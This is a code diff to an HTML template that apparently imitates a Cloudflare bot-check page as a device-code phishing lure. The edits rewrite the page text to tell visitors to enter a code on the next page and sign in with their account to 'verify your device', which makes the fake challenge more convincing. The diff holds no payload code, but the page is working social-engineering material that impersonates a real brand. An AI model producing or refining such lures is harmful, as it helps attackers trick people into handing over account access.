@@ -2576,9 +2576,9 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 				</header>
 
 				<div class="card-body">
-					<h1 id="card-title">Verify you're not a robot</h1>
+					<h1 id="card-title">Verify you're human</h1>
 					<p class="subtitle">
-						Complete the challenge below on the next page to continue.
+						Enter the code on the next page to continue to verify your device. <br> This helps us ensure that you're not a bot.
 					</p>
 
 					<div class="captcha-frame">
@@ -2616,12 +2616,11 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 						</button>
 					</div>
 					<p class="hint">
-						Bots and automated devices cannot pass to the next page, so we do
-						this to make you safer.
+						You may be prompted to sign-in with your account if Cloudflare have not verified your device before.
 					</p>
 
 					<button id="verify-device" class="verify-btn" type="button">
-						Verify device
+						Complete device Challenge
 					</button>
 				</div>
 			</section>
